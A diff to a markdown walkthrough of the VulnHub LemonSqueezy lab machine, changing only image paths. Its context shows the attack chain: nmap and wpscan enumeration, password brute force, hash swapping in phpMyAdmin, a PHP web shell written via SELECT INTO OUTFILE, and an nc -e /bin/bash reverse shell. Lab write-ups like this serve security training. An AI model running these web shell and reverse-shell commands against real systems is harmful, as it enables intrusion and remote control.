@@ -3,7 +3,7 @@
 - **Machine:** LemonSqueezy: 1
 - **Download:** https://www.vulnhub.com/entry/lemonsqueezy-1,473/
 
-![](803-1.png)
+![](images/803-1.png)
 
 ---
 
@@ -15,11 +15,11 @@
 7z x LemonSqueezy.7z
 ```
 
-![](803-2.png)
+![](images/803-2.png)
 
 2. Create a new virtual machine in VirtualBox.
 
-![](803-3.png)
+![](images/803-3.png)
 
 3. Open the VM settings.
 
@@ -31,15 +31,15 @@ VirtualBox → LemonSqueezy → Settings → Storage
 - Remove the existing **SATA Controller**.
 - Click **Add Hard Disk** and attach the provided virtual disk.
 
-![](803-4.png)
+![](images/803-4.png)
 
-![](803-5.png)
+![](images/803-5.png)
 
 4. Click **Choose** after selecting the disk.
 5. Configure the network adapter as **Bridged Adapter**.
 6. Start the virtual machine.
 
-![](803-6.png)
+![](images/803-6.png)
 
 ---
 
@@ -51,7 +51,7 @@ VirtualBox → LemonSqueezy → Settings → Storage
 nmap -sn 192.168.2.0/24
 ```
 
-![](803-7.png)
+![](images/803-7.png)
 
 ---
 
@@ -63,7 +63,7 @@ Run a complete scan to enumerate open ports, services, operating system details,
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.226
 ```
 
-![](803-8.png)
+![](images/803-8.png)
 
 ---
 
@@ -87,7 +87,7 @@ Use the `http-enum` NSE script to identify hidden web resources.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.226
 ```
 
-![](803-9.png)
+![](images/803-9.png)
 
 ---
 
@@ -111,7 +111,7 @@ Add the hostname entry.
 nano /etc/hosts
 ```
 
-![](803-10.png)
+![](images/803-10.png)
 
 Visit the application using the hostname.
 
@@ -126,7 +126,7 @@ Visit the application using the hostname.
 wpscan --url http://lemonsqueezy/wordpress/ -e u
 ```
 
-![](803-11.png)
+![](images/803-11.png)
 
 Discovered users:
 
@@ -151,7 +151,7 @@ Test the **orange** account.
 wpscan --url http://lemonsqueezy/wordpress/ --usernames orange --passwords /opt/rockyou.txt
 ```
 
-![](803-12.png)
+![](images/803-12.png)
 
 Recovered credentials:
 
@@ -164,7 +164,7 @@ Login to WordPress.
 
 - http://lemonsqueezy/wordpress/wp-login.php
 
-![](803-13.png)
+![](images/803-13.png)
 
 ---
 
@@ -176,7 +176,7 @@ After logging into WordPress, navigate to:
 Posts
 ```
 
-![](803-14.png)
+![](images/803-14.png)
 
 ---
 
@@ -191,15 +191,15 @@ Password : n0t1n@w0rdl1st!
 
 - http://192.168.2.226/phpmyadmin/
 
-![](803-15.png)
+![](images/803-15.png)
 
 Navigate to the `wordpress` database and open the `wp_users` table.
 
-![](803-16.png)
+![](images/803-16.png)
 
 Copy the password hash from the **orange** account and replace the password hash for the **lemon** account.
 
-![](803-17.png)
+![](images/803-17.png)
 
 Login again using:
 
@@ -210,7 +210,7 @@ Password : ginger
 
 - http://lemonsqueezy/wordpress/wp-login.php
 
-![](803-18.png)
+![](images/803-18.png)
 
 ---
 
@@ -234,11 +234,11 @@ Navigate to:
 Plugins → Add New → Upload Plugin
 ```
 
-![](803-19.png)
+![](images/803-19.png)
 
 The upload is blocked.
 
-![](803-20.png)
+![](images/803-20.png)
 
 ---
 
@@ -250,13 +250,13 @@ Open the **SQL** tab and execute:
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
 ```
 
-![](803-21.png)
+![](images/803-21.png)
 
 Verify command execution.
 
 - http://lemonsqueezy/wordpress/backdoor.php?cmd=id
 
-![](803-22.png)
+![](images/803-22.png)
 
 ---
 
@@ -276,7 +276,7 @@ http://lemonsqueezy/wordpress/backdoor.php?cmd=nc%20-e%20/bin/bash%20192.168.2.2
 
 A reverse shell is successfully established.
 
-![](803-23.png)
+![](images/803-23.png)
 
 ---
 
